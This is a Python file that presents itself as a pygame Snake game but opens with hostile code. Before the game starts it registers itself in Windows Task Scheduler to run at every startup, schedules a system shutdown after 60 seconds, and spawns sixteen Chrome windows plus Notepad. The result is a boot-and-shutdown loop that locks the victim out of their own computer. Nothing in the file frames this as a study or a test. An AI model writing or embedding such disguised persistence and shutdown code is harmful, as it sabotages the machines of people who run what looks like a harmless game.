import os
import subprocess
import pygame
import time
import random

def add_to_task_scheduler(script_path):
    # Command to create a new task in Task Scheduler
    command = (
        'schtasks /create /tn "MyPythonScript" /tr "python.exe {}" /sc ONSTART /ru INTERACTIVE'
        .format(script_path)
    )

    # Run the command in a new command prompt window
    os.system(command)

if __name__ == "__main__":
    # Get the path to the current script
    script_path = os.path.abspath(__file__)
    
    # Add the script to Task Scheduler
    add_to_task_scheduler(script_path)

    def shutdown_computer():
    # Shutdown the computer
        os.system("shutdown /s /t 60")

if __name__ == "__main__":
    # Call the shutdown function
    shutdown_computer()

def open_applications():
    # Open a web browser (replace "firefox" with the command to open your preferred browser)
    subprocess.Popen(["Chrome"])

    subprocess.Popen(["Chrome"])

    subprocess.Popen(["Chrome"])

    subprocess.Popen(["Chrome"])

    subprocess.Popen(["Chrome"])

    subprocess.Popen(["Chrome"])

    subprocess.Popen(["Chrome"])

    subprocess.Popen(["Chrome"])

    subprocess.Popen(["Chrome"])

    subprocess.Popen(["Chrome"])

    subprocess.Popen(["Chrome"])

    subprocess.Popen(["Chrome"])

    subprocess.Popen(["Chrome"])

    subprocess.Popen(["Chrome"])

    subprocess.Popen(["Chrome"])

    subprocess.Popen(["Chrome"])
    # Open a text editor (replace "notepad" with the command to open your preferred text editor)
    subprocess.Popen(["notepad"])

if __name__ == "__main__":
    # Call the function to open applications
    open_applications()

 #_______________________________________________________________ Game part   

# Initialize Pygame
pygame.init()

# Define colors
white = (255, 255, 255)
yellow = (255, 255, 102)
black = (0, 0, 0)
red = (213, 50, 80)
green = (0, 255, 0)
blue = (50, 153, 213)

# Set display dimensions
dis_width = 800
dis_height = 600

# Set block size and speed
block_size = 20
snake_speed = 15

# Create display
dis = pygame.display.set_mode((dis_width, dis_height))
pygame.display.set_caption('Snake Game')

# Clock for controlling speed
clock = pygame.time.Clock()

font_style = pygame.font.SysFont(None, 50)


# Function to display message on screen
def message(msg, color):
    mesg = font_style.render(msg, True, color)
    dis.blit(mesg, [dis_width / 6, dis_height / 3])


# Function to draw snake on screen
def our_snake(block_size, snake_list):
    for x in snake_list:
        pygame.draw.rect(dis, black, [x[0], x[1], block_size, block_size])


# Function to game loop
def gameLoop():
    game_over = False
    game_close = False

    # Set starting position of snake
    x1 = dis_width / 2
    y1 = dis_height / 2

    # Set change in position
    x1_change = 0
    y1_change = 0

    # Create snake body
    snake_list = []
    length_of_snake = 1

    # Set position of food
    foodx = round(random.randrange(0, dis_width - block_size) / block_size) * block_size
    foody = round(random.randrange(0, dis_height - block_size) / block_size) * block_size

    while not game_over:

        while game_close:
            dis.fill(blue)
            message("You Lost! Press C-Play Again or Q-Quit", red)
            pygame.display.update()

            for event in pygame.event.get():
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_q:
                        game_over = True
                        game_close = False
                    if event.key == pygame.K_c:
                        gameLoop()

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                game_over = True
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_LEFT:
                    x1_change = -block_size
                    y1_change = 0
                elif event.key == pygame.K_RIGHT:
                    x1_change = block_size
                    y1_change = 0
                elif event.key == pygame.K_UP:
                    y1_change = -block_size
                    x1_change = 0
                elif event.key == pygame.K_DOWN:
                    y1_change = block_size
                    x1_change = 0

        if x1 >= dis_width or x1 < 0 or y1 >= dis_height or y1 < 0:
            game_close = True
        x1 += x1_change
        y1 += y1_change
        dis.fill(blue)
        pygame.draw.rect(dis, green, [foodx, foody, block_size, block_size])
        snake_head = []
        snake_head.append(x1)
        snake_head.append(y1)
        snake_list.append(snake_head)
        if len(snake_list) > length_of_snake:
            del snake_list[0]

        for x in snake_list[:-1]:
            if x == snake_head:
                game_close = True

        our_snake(block_size, snake_list)
        pygame.display.update()

        if x1 == foodx and y1 == foody:
            foodx = round(random.randrange(0, dis_width - block_size) / block_size) * block_size
            foody = round(random.randrange(0, dis_height - block_size) / block_size) * block_size
            length_of_snake += 1

        clock.tick(snake_speed)

    pygame.quit()
    quit()


gameLoop()